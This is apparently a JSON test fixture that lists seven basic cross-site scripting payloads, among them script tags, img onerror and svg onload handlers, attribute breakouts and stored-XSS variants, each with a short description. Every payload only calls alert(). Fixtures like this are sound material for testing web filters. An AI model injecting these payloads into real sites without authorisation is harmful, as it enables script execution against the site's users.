{
  "vulnerability": "Cross-Site Scripting (XSS)",
  "cases": [
    {
      "id": "xss-script-01",
      "payload": "<script>alert(1)</script>",
      "description": "Basic script tag injection — executes immediately on page load."
    },
    {
      "id": "xss-img-01",
      "payload": "<img src=x onerror=alert(1)>",
      "description": "Image tag with onerror event handler injection (bypasses basic script tag filters)."
    },
    {
      "id": "xss-svg-01",
      "payload": "<svg onload=alert(1)>",
      "description": "SVG tag with onload event handler injection."
    },
    {
      "id": "xss-attr-break-01",
      "payload": "\"><script>alert(1)</script>",
      "description": "Breaks out of an HTML attribute with a double quote before injecting a script tag."
    },
    {
      "id": "xss-quote-break-01",
      "payload": "'><script>alert(1)</script>",
      "description": "Breaks out of a single-quoted HTML attribute before injecting a script tag."
    },
    {
      "id": "xss-stored-comment-01",
      "payload": "<script>alert('stored-xss')</script>",
      "description": "Payload submitted via forms persists in the database and executes on every page load — Stored XSS."
    },
    {
      "id": "xss-stored-img-01",
      "payload": "<img src=x onerror=alert('stored-xss')>",
      "description": "Stored image payload designed to bypass naive script stripping in backend databases."
    }
  ]
}